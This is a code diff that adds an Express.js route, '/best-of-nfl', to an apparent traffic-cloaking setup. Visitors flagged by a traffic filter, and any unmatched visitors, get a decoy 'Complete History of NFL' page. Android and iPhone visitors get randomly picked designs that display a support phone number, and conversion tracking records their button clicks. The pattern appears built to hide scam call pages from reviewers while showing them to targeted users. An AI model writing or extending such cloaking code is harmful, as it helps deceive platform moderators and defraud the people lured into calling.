@@ -108,6 +108,34 @@ router.get('/endpoint2', trafficFilter, (req, res) => {
   return res.render('dummy2', { title: 'Complete History of Hollywood',clarity });
 });
 
+router.get('/best-of-nfl', trafficFilter, (req, res) => {
+  const result = req.trafficResult;
+  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
+  const clarity = process.env.CLARITY_ID || '1111111';
+
+
+  if (result.blocked) {
+    return res.render('dummy1', {
+      title: 'Complete History of NFL',
+      clarity
+    });
+  }
+
+  
+
+
+  if (result.contentServed === 'android') {
+    const design = randomPick(ANDROID_DESIGNS);
+    return res.render(design.view, { title: design.title, phone,clarity });
+  }
+
+  if (result.contentServed === 'iphone') {
+    const design = randomPick(IPHONE_DESIGNS);
+    return res.render(design.view, { title: design.title, phone,clarity });
+  }
+
+  return res.render('dummy1', { title: 'Complete History of NFL',clarity });
+});
 // ===== CONVERSION TRACKING API =====
 
 // POST /api/convert — fired when user clicks Yes/No button
